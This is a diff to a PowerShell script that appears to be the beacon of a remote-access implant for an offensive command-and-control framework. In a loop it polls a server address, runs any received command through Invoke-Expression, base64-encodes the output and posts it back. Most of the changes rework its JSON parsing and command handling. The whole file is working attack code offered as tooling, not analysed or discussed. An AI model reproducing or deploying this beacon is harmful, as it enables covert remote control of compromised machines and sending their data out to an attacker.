@@ -19,20 +19,21 @@ $checkin = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`"}"
 while ($True) {
 	$serverMsg = (Invoke-WebRequest -Method Post -Uri $h0me -Body $checkin -UserAgent $useragent -UseBasicParsing).Content
 	$jsondata = "{" + $serverMsg.split("{")[1].split("`n")[0]
-	if($curcmnd -ne $jsondata) {
-		$curcmnd = $jsondata
-		# Convert json string to PS hashtable by hand ... cancer
-		$jsondata.trim("{").trim("}").split(",") | foreach {
-			$key = $_.split(":")[0].trim(" ")
-			$key = $key.Substring(1, ($key.length)-2)
-			$value = $_.split(":")[1].trim(" ")
-			$value = $value.Substring(1, ($value.length)-2)
-			$value = $value.Replace('\"','"')
-			$jsObject[$key] = $value
-		}
+	# Convert json string to PS hashtable by hand ... cancer
+	$jsondata.trim("{").trim("}").split(",") | foreach {
+		$key = $_.split(":")[0].trim(" ")
+		$key = $key.Substring(1, ($key.length)-2)
+		$value = $_.split(":")[1].trim(" ")
+		$value = $value.Substring(1, ($value.length)-2)
+		$value = $value.Replace('\"','"')
+		$jsObject[$key] = $value
+	}
+	if($jsObject['cmnd']) {
+
 		if($jsObject['cmnd'] -eq "quit") {
 			exit
 		}
+
 		elseif($jsObject['cmnd'] -eq "spawn") {
 			try {
 				$req = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"req`": `"spawn`"}"
@@ -45,6 +46,7 @@ while ($True) {
 				$retval = "[-] Spawn failed..."
 			}
 		}
+
 		else {
 			$retval = IEX $jsObject.cmnd -ErrorVariable err 2>&1
 			if($err) {
@@ -55,6 +57,8 @@ while ($True) {
 		if(!($retval)) {
 			$retval = "[-] No results returned"
 		}
+
+    $jsObject.cmnd = ""
 		$ncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($retval))
 		$resp = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"retval`": `"$ncoded`"}"
 		$null = Invoke-WebRequest -Method Post -Uri $h0me -Body $resp -UserAgent $useragent -UseBasicParsing
